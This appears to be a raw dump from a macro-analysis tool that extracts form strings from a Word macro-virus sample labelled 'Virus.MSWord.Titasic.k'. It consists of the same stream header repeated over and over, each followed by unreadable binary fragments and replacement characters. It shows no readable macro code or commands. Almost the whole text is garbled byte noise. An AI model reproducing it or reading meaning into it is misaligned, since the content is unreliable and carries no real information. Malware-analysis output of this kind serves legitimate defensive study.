!!!!!!888���������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ��������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ�������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������888---���������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ����������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xxx������������������������������---!!!!!!!!!---������������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ�������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������������������������$$$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������---!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!---������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������888
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!---������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������---!!!!!!!!!888������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������������������������������������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������������������������---!!!!!!---������������������������������������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������(((
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������---!!!!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������888������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������---888���������������������������������������������������5553339995k�4h�4h�4h�4h�4h�4h�4h�4h�4h�4h�4h�4h�4h�4h�4h�4h�4h�4h�0a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������555%%%0a�8p�<x�@��@��@��@��@��@��@��@��@��@��@��@��@��@��@��@��@��@��<x�4h�###
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
888���������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!888������������888
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������$$$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɥ�����������������������������������������������������������3330a�<x�@��@��@��@��@��<x�<y�<y�A��A��A��A��A��A��A��A��<y�8q�4h�8p�<x�<x�8p�0a�###
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|||������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xxx������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������///
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ�������������������������������������������������������<<<4h�@��@��@��@��@��<x�4h�777��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BBB8887778q�<x�@��<x�8p�0a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p			
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!---���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������   
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ�������������������������������������������������������<<<4h�@��@��@��@��<x�4h�$$$000��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---8p�@��@��@��<x�0a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������������������������������������777
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������������<<<4h�@��@��<x�<y�9r�888000��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<<<9999r�@��@��@��@��8p�###
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!---���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɣ�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������---!!!!!!!!!!!!---���������������������������������3330a�<x�@��8p�???��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<y�<x�@��@��8p�-Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a)))������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~~---!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������555%%%0a�4h�1b�999��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8884h�<x�@��8p�###
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������---!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̟��"""
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$$$���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������555(((//////��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
000$$$0a�4h�-Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ����������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
𬬬---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!---������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������)))��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!---������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϝ��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̟��   
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|||------������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������AAA��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ����!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������>>>��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
